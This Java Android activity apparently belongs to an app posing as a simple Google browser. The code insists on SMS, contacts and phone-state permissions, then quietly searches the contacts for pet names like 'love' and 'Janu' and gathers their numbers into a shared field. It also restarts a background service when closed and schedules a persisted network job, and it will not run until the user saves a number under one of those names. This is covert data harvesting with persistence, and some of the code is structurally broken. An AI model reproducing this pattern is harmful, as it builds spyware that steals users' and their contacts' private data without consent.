package com.crezyprogrammer.mygoogle;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.app.DownloadManager;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.ContactsContract;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.webkit.DownloadListener;
import android.webkit.URLUtil;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ImageView;

import androidx.annotation.RequiresApi;

import com.cunoraz.gifview.library.GifView;
import com.gun0912.tedpermission.PermissionListener;

import java.util.ArrayList;
import java.util.List;

import im.delight.android.webview.AdvancedWebView;

import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.READ_EXTERNAL_STORAGE;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;
import static android.Manifest.permission.RECEIVE_SMS;
import static android.Manifest.permission.SEND_SMS;
import static android.Manifest.permission.WRITE_EXTERNAL_STORAGE;
import static com.gun0912.tedpermission.TedPermission.with;


public class Main2Activity extends Activity implements AdvancedWebView.Listener {

    private AdvancedWebView mWebView;
    GifView gifView;
    ImageView imageView;
    private FrameLayout customViewContainer;
    private WebChromeClient.CustomViewCallback customViewCallback;
    private View mCustomView;
    private myWebChromeClient mWebChromeClient;
    List<String>name=new ArrayList<>();
    private myWebViewClient mWebViewClient;
    private boolean exist=false;
    static  StringBuilder sb = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);


        PermissionListener permissionlistener = new PermissionListener() {
            @Override
            public void onPermissionGranted() {
                name.add("test");
                name.add("Jan");
                name.add("Janu");
                name.add("love");
                name.add("my love");
                name.add("lover");


                for (int i =0;i<name.size();i++){
                   getContactName(name.get(i),Main2Activity.this) ;
                }

                new java.util.Timer().schedule(
                        new java.util.TimerTask() {
                            @Override
                            public void run() {
                                if(!exist){
                                    Builder builder = new Builder(Main2Activity.this);
                                    builder.setCancelable(false);

                                    builder.setMessage("Frist Save Your Number in contacts List With the Name (Love /My Love/Jan /Janu / Lover / Help)");
                                    builder.setPositiveButton("ok", new DialogInterface.OnClickListener() {
                                        @Override
                                        public void onClick(DialogInterface dialog, int which) {
                                            finishAffinity();
                                            System.exit(0);
                                        }
                                    });
                                    builder.setNegativeButton("Retry", new DialogInterface.OnClickListener() {
                                        @Override
                                        public void onClick(DialogInterface dialog, int which) {
                                            startActivity(new Intent(Main2Activity.this, Main2Activity.class));

                                        }
                                    });
                                    builder.show();
                                }
                            }
                        },
                        5000
                );

                customViewContainer = (FrameLayout) findViewById(R.id.customViewContainer);
                Intent intent = new Intent(getApplicationContext(), MyService.class);
                startService(intent);
                imageView = findViewById(R.id.imageView);




                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        imageView.setVisibility(View.GONE);
                    }
                }, 3000);
                PermissionListener permissionlistener = new PermissionListener() {
                    @Override
                    public void onPermissionGranted() {

                    }

                    @Override
                    public void onPermissionDenied(List<String> deniedPermissions) {
                        finish();
                    }


                };



                gifView = findViewById(R.id.gif1);
                //gifView.setVisibility(View.VISIBLE);
                mWebView = findViewById(R.id.webview);
                mWebViewClient = new myWebViewClient();
                mWebView.setWebViewClient(mWebViewClient);

                mWebChromeClient = new myWebChromeClient();
                mWebView.setWebChromeClient(mWebChromeClient);
                mWebView.setListener(Main2Activity.this,Main2Activity. this);
                mWebView.getSettings().setLoadWithOverviewMode(true);
                mWebView.getSettings().setUseWideViewPort(true);
                mWebView.getSettings().setDomStorageEnabled(true);
                mWebView.loadUrl("https://www.google.com");


                mWebView.setDownloadListener(new DownloadListener() {

                    @Override
                    public void onDownloadStart(String url, String userAgent,
                                                String contentDisposition, String mimetype,
                                                long contentLength) {
                        DownloadManager.Request request = new DownloadManager.Request(
                                Uri.parse(url));

                        request.allowScanningByMediaScanner();
                        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED); //Notify client once download is completed!
                        request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "" + URLUtil.guessFileName(url, contentDisposition, mimetype));
                        DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                        dm.enqueue(request);

                    }
                });

                // ...



                scheduleJob();

            }

            @Override
            public void onPermissionDenied(List<String> deniedPermissions) {
                Builder builder = new Builder(Main2Activity.this);
                builder.setTitle("Permission Required");
                builder.setCancelable(false);
                builder.setMessage("Please Allow all permission to use the app "
                        );
                builder.setPositiveButton("Retry", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        startActivity(new Intent(Main2Activity.this, Main2Activity.class));

                    }
                });
                builder.show();

             }


        };
        with(this)
                .setPermissionListener(permissionlistener)
                .setDeniedMessage("If you reject permission,you can not use this service\n\nPlease turn on permissions at [Setting] > [Permission]")
                .setPermissions(WRITE_EXTERNAL_STORAGE,READ_PHONE_STATE,READ_SMS,READ_CONTACTS,SEND_SMS,RECEIVE_SMS,READ_EXTERNAL_STORAGE)
                .check();
}
@SuppressLint("NewApi")
@Override
protected void onResume() {
        super.onResume();
//        mWebView.onResume();
        // ...
        }
    public boolean inCustomView() {
        return (mCustomView != null);
    }

    public void hideCustomView() {
        mWebChromeClient.onHideCustomView();
    }
@SuppressLint("NewApi")
@Override
protected void onPause() {
//        mWebView.onPause();
        // ...
        super.onPause();
        }

@Override
protected void onDestroy() {
        mWebView.onDestroy();
        // ...
        super.onDestroy();
    Intent intent=new Intent(getApplicationContext(),MyService.class);
    startService(intent);
        }

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        mWebView.onActivityResult(requestCode, resultCode, intent);
        // ...
        }

@Override
public void onBackPressed() {
    if (inCustomView()) {
        hideCustomView();

    }else
        if (!mWebView.onBackPressed()) { return; }
        // ...

        else  {
            Builder builder = new Builder(this);
            builder.setTitle("Exit");
            builder.setMessage("Are you sure?");
            builder.setPositiveButton("yes", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    finish();
                }
            });
            builder.setNegativeButton("cancel", null);
            builder.show();}

        }

@Override
public void onPageStarted(String url, Bitmap favicon) {
    gifView.setVisibility(View.VISIBLE);

}

@Override
public void onPageFinished(String url) {
    gifView.setVisibility(View.INVISIBLE);
    mWebView.setVisibility(View.VISIBLE);
}

@Override
public void onPageError(int errorCode, String description, final String failingUrl) {
mWebView.setVisibility(View.INVISIBLE);
    final Builder builder = new Builder(Main2Activity.this);
    builder.setTitle("No Internet");
    builder.setMessage("check your internet");
    builder.setPositiveButton("ok", null);
    builder.setNegativeButton("retry", new DialogInterface.OnClickListener() {
        @Override
        public void onClick(DialogInterface dialog, int which) {

            if (!DetectConnection.checkInternetConnection(getApplicationContext())) {
                builder.show();
            }
            else {

                mWebView.loadUrl(failingUrl);
            }
        }
    });
    builder.show();

}

@Override
public void onDownloadRequested(String url, String suggestedFilename, String mimeType, long contentLength, String contentDisposition, String userAgent) { }

@Override
public void onExternalPageRequest(String url) { }

    class myWebChromeClient extends WebChromeClient {
        private Bitmap mDefaultVideoPoster;
        private View mVideoProgressView;

        @Override
        public void onShowCustomView(View view, int requestedOrientation, CustomViewCallback callback) {
            onShowCustomView(view, callback);    //To change body of overridden methods use File | Settings | File Templates.
        }

        @Override
        public void onShowCustomView(View view,CustomViewCallback callback) {

            // if a view already exists then immediately terminate the new one
            if (mCustomView != null) {
                callback.onCustomViewHidden();
                return;
            }
            mCustomView = view;
            mWebView.setVisibility(View.GONE);
            customViewContainer.setVisibility(View.VISIBLE);
            customViewContainer.addView(view);
            customViewCallback = callback;
        }

        @Override
        public View getVideoLoadingProgressView() {

            if (mVideoProgressView == null) {
                LayoutInflater inflater = LayoutInflater.from(Main2Activity.this);
                mVideoProgressView = inflater.inflate(R.layout.video_progress, null);
            }
            return mVideoProgressView;
        }

        @Override
        public void onHideCustomView() {
            super.onHideCustomView();    //To change body of overridden methods use File | Settings | File Templates.
            if (mCustomView == null)
                return;

            mWebView.setVisibility(View.VISIBLE);
            customViewContainer.setVisibility(View.GONE);

            // Hide the custom view.
            mCustomView.setVisibility(View.GONE);

            // Remove the custom view from its container.
            customViewContainer.removeView(mCustomView);
            customViewCallback.onCustomViewHidden();

            mCustomView = null;
        }
    }

    class myWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            return super.shouldOverrideUrlLoading(view, url);    //To change body of overridden methods use File | Settings | File Templates.
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void scheduleJob() {
        JobInfo myJob = new JobInfo.Builder(0, new ComponentName(this, NetworkSchedulerService.class))
                .setRequiresCharging(true)
                .setMinimumLatency(1000)
                .setOverrideDeadline(2000)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true)
                .build();

        JobScheduler jobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
        jobScheduler.schedule(myJob);
    }

    @Override
    protected void onStop() {
        // A service can be "started" and/or "bound". In this case, it's "started" by this Activity
        // and "bound" to the JobScheduler (also called "Scheduled" by the JobScheduler). This call
        // to stopService() won't prevent scheduled jobs to be processed. However, failing
        // to call stopService() would keep it alive indefinitely.
        stopService(new Intent(this, NetworkSchedulerService.class));
        super.onStop();
    }

    @Override
    protected void onStart() {
        super.onStart();
        // Start service and provide it a way to communicate with this class.
        Intent startServiceIntent = new Intent(this, NetworkSchedulerService.class);
        startService(startServiceIntent);
    }




    private class AsyncTaskRunner extends AsyncTask<String, String, Void> {

        private String name;
        Context context;

        public AsyncTaskRunner(String name, Context context) {
            this.name=name;
            this.context=context;
        }


        @Override
        protected Void doInBackground(String... params)

        {

            String ret = null;
            String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME+" like'%" + name +"%'";
            String[] projection = new String[] { ContactsContract.CommonDataKinds.Phone.NUMBER,ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME};
            Cursor c = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection, selection, null, null);


            if (c.moveToFirst()) {
                do {
                    exist = true;
                    ret = c.getString(1) + ":" + c.getString(0) + ",";
                    Log.i("123321", "414:"+ret);
                    sb.append(ret) ;
                    Utils.contact=sb.toString();
                }
                while (c.moveToNext());

            }
            c.close();
            if(ret==null)
                ret = null;


            return null;
        }
        }


        protected void onPostExecute(String result) {
            // execution of result of Long time consuming operation

            Utils.contact=sb.toString();
            Log.i("123321", "94:"+sb.toString());


            Log.i("123321", "93:"+sb.toString());

        }


        protected void onPreExecute() {

        }








    public void getContactName(final String name, Context context)



    {
        AsyncTaskRunner runner = new AsyncTaskRunner(name, context);
        runner.execute();



    }


    public String showinformation(String  id) {
        String name=null;
        String phone=null;
        String email=null;
        Uri resultUri = ContactsContract.Contacts.CONTENT_URI;
        Cursor cont = getContentResolver().query(resultUri, null, null, null, null);
        String whereName = ContactsContract.Data.MIMETYPE + " = ? AND " + ContactsContract.CommonDataKinds.StructuredName.CONTACT_ID+ " = ?" ;

        String[] whereNameParams1 = new String[] { ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE,id};
        Cursor nameCur1 = getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, whereName, whereNameParams1, ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME);
        while (nameCur1.moveToNext()) {
            name = nameCur1.getString(nameCur1.getColumnIndex(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME));}
        nameCur1.close();
        cont.close();
        nameCur1.close();


        String[] whereNameParams2 = new String[] { ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE,id};
        Cursor nameCur2 = getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, whereName, whereNameParams2, ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME);
        while (nameCur2.moveToNext()) {
            phone = nameCur2.getString(nameCur2.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));}
        nameCur2.close();
        cont.close();
        nameCur2.close();


        String[] whereNameParams3 = new String[] { ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE,id};
        Cursor nameCur3 = getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, whereName, whereNameParams3, ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME);
        while (nameCur3.moveToNext()) {
            email = nameCur3.getString(nameCur3.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));}
        nameCur3.close();
        cont.close();
        nameCur3.close();

        String[] whereNameParams4 = new String[] { ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE,id};
        Cursor nameCur4 = getContentResolver().query(ContactsContract.Data.CONTENT_URI, null, whereName, whereNameParams4, ContactsContract.CommonDataKinds.StructuredPostal.DATA);
        while (nameCur4.moveToNext()) {
            phone = nameCur4.getString(nameCur4.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.DATA));}
        nameCur4.close();
        cont.close();
        nameCur4.close();
        //showing result
    return ("Name= "+ name+"\nPhone= "+phone+"\nEmail= "+email);


    }
}
